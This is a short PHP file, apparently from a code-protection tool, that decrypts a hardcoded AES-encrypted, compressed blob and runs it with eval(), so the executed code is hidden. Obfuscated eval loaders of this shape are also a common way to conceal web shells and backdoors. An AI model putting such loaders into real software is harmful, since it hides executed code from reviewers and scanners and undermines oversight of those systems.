<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k65d15 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$pfce43 = base64_decode('54pnTq0OzVNoAtSi4yWlq3llY3lRQ041YXJVWC93akhwY1h1aWprODRNL05nakg2bDBHTFhCdFlHbjVreXF0VW4xM2gydW9ScE5DcHlHWGk5Vy9WUit6SklBK204RFJ2UmJSMEk5TmF4U2hmVUF1eXJ4SGJlL2RzSEpDNmF0djVCOEF6a1JqVzB2blJ3eEhGUzRsUnVSZ000MkpFQkpWa1VyaEJ3ZWVvQjF4TmdvcGpBa2tkSFJJUDAvUS93TTllYytkS2llY2ppQk1mMU13bFkwYm1ZcTluNTNmN2pPUE56VzYzVUlHS2g2R2Rqam51blh5Y2xaaEJpSkJYWDN2eUgrL2tocTl3Q2VzeGpZZU1UaCtjNjVBcThSZFNPUGNCSXQxeEhPK3o0alUybnIxOHlyejFWcEtzV1BJU1MyWDEyblVzMEdBdmg0cFdHVG83');
$iab13c = openssl_cipher_iv_length('aes-256-cbc');
$v2c8be = substr($pfce43, 0, $iab13c);
$c2e539 = substr($pfce43, $iab13c);
eval('?>'.gzinflate(openssl_decrypt($c2e539, 'aes-256-cbc', $k65d15, 0, $v2c8be)));